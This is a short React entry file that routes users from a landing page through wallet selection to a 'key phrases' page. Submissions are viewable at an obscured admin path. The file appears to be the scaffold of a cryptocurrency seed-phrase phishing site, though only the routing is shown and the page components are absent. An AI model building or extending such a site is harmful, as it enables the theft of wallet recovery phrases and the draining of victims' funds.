import React, { useState } from "react";
import ReactDOM from "react-dom/client";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import LandingPage from "./pages/LandingPage";
import WalletSelectionPage from "./pages/WalletSelectionPage";
import KeyPhrasesPage from "./pages/KeyPhrasesPage";
import SubmissionsPage from "./pages/SubmissionsPage";
import "./App.css";

const App = () => {
  const [selectedWallet, setSelectedWallet] = useState(null);

  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route
        path="/select-wallet"
        element={<WalletSelectionPage setSelectedWallet={setSelectedWallet} />}
      />
      <Route
        path="/key-phrases"
        element={<KeyPhrasesPage selectedWallet={selectedWallet} />}
      />
      <Route path="/admin-submissions-9a7f3b4e2d" element={<SubmissionsPage />} />
    </Routes>
  );
};

const container = document.getElementById("root");
if (!container) {
  throw new Error('No root element found. Make sure you have <div id="root"></div> in your index.html.');
}
const root = ReactDOM.createRoot(container);
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);
